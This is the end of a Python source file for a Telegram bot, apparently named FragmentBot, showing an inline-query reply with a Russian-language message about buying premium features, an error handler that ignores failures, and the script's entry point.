                            f"🚀 <b>Назначение:</b> Покупка премиум функций\n"
                            f"🛡️ <b>Безопасность:</b> Защищен от мошенничества\n\n"
                            f"💡 <b>Нажмите кнопку ниже для активации!</b>"
                        ), parse_mode="HTML"),
                        reply_markup=kb
                    )
                await q.answer([result], cache_time=1)
        except Exception as e:
            # Ignore expired queries or other errors
            pass

    return router



if __name__ == "__main__":
    try: asyncio.run(FragmentBot().run())
    except KeyboardInterrupt: print_warning("Stopped.")
